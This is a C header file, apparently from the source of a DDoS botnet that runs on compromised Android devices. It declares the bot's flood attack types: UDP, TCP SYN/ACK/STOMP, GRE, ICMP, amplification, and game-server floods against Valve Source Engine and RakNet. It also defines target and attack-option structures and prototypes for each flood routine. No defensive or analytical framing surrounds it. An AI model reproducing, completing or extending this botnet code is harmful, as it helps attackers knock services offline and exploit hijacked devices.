#ifndef FLOOD_H
#define FLOOD_H

#include <arpa/inet.h>
#include <netinet/in.h>
#include <stddef.h>
#include <stdint.h>
#include <string.h>

#include "bot/definitions.h"
#include "bot/utils/bytebuf.h"

#define MAX_PACKET_LENGTH 1510

enum {
  // udp
  FLOOD_UDPPLAIN,
  FLOOD_UDPRAW,

  // tcp
  FLOOD_TCPSYN,
  FLOOD_TCPACK,
  FLOOD_TCPTFO,
  FLOOD_STOMP,

  // l3
  FLOOD_IPIPUDP,
  FLOOD_GREIP,
  FLOOD_ICMP,

  FLOOD_SOCKET, // Generic socket flood
  FLOOD_TCPWRA, // SYN with random OS header traits

  FLOOD_UDPVSE,     // Valve Source Engine specific UDP flood
  FLOOD_UNK_UNUSED, // OG tcp bypass that somehow works decently
  FLOOD_UDPAMP,     // UDP amplification, useless since we're on droids

  FLOOD_ACK_STATIC, // Static ACK flood
  FLOOD_RAKNET,     // RakNet specific UDP flood
};

enum {
  OPT_DPORT,
  OPT_SPORT,

  // data len customization
  OPT_LEN,
  OPT_MINLEN,
  OPT_MAXLEN,

  OPT_RANDOMIZE,
  OPT_PAYLOAD,

  // pps limiter for some floods (udp plain, tcp socket)
  OPT_MINPPS,
  OPT_MAXPPS,
  OPT_SLEEP,

  OPT_CONNS,
  OPT_REPEAT,

  OPT_COPY_WINDOW,
  OPT_TTL,
  OPT_SOURCES,

  MAX_OPTIONS,
};

enum {
  FLOOD_TYPE_A,
  FLOOD_TYPE_DOMAIN,
};

typedef struct {
  uint32_t address;
  uint8_t netmask;
  struct sockaddr_in saddr;
} target_t, *ptarget_t;

typedef struct {
  uint8_t id;
  uint8_t *data;
  size_t len;
} option_t, *poption_t;

typedef struct {
  uint32_t atk_id;
  uint8_t id;

  uint32_t duration;

  int num_targs;
  int num_opts;

  ptarget_t targets;
  poption_t options;
} flood_context_t, *pflood_context_t;

typedef void (*flood_func_t)(pflood_context_t);

void flood_parse(pbytebuf_t buf);
void flood_free(pflood_context_t ctx);

void flood_udpplain(pflood_context_t ctx);
void flood_udpraw(pflood_context_t ctx);
void flood_udpamp(pflood_context_t ctx);
void flood_udpvse(pflood_context_t ctx);
void flood_udpraknet(pflood_context_t ctx);

void flood_tcpsyn(pflood_context_t ctx);
void flood_tcptfo(pflood_context_t ctx);
void flood_tcpack(pflood_context_t ctx);
void flood_tcpwra(pflood_context_t ctx);
void flood_tcpstomp(pflood_context_t ctx);
void flood_tcpsocket(pflood_context_t ctx);

void flood_ipipudp(pflood_context_t ctx);
void flood_greip(pflood_context_t ctx);
void flood_icmpecho(pflood_context_t ctx);

void flood_tcpack_static(pflood_context_t ctx);

/**
 * Randomizes target address
 */
void target_random_addr(ptarget_t target);

void target_random_port(ptarget_t target, u16 port);
poption_t flood_retrieve_opt(pflood_context_t ctx, u8 id);
puint8_t flood_retrieve_bytes(pflood_context_t ctx, u8 id, size_t *len);
u8 flood_retrieve_u8(pflood_context_t ctx, u8 id, u8 def);
u16 flood_retrieve_u16(pflood_context_t ctx, u8 id, u16 def);
u32 flood_retrieve_u32(pflood_context_t ctx, u8 id, u32 def);
uint32_t *flood_retrieve_iplist(pflood_context_t, u8, size_t *);
pu8 flood_generate(u16 len, u16 min, u16 max, pu8 payload, size_t *out);

#endif
